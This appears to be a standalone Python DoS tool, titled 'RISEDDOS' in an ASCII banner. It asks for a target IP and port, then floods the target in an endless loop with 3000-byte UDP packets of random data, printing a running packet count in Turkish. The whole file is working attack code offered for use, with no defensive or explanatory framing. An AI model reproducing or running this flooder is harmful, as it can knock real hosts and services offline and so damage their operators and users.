import socket, os, time, random

time.sleep(0.1)


banner ="""

██████╗ ██╗███████╗███████╗██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██║██╔════╝██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██████╔╝██║███████╗█████╗  ██║  ██║██║  ██║██║   ██║███████╗
██╔══██╗██║╚════██║██╔══╝  ██║  ██║██║  ██║██║   ██║╚════██║
██║  ██║██║███████║███████╗██████╔╝██████╔╝╚██████╔╝███████║
╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
"""
print(banner)

target_ip = input("Enter a Target ====>")
port = int(input("Enter a Port ====>"))

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bitler = random._urandom(3000)


paket=0

while True:
    s.sendto(bitler,(target_ip,port))
    paket+=1
    print("Gönderilen Paket: %s"%(paket))


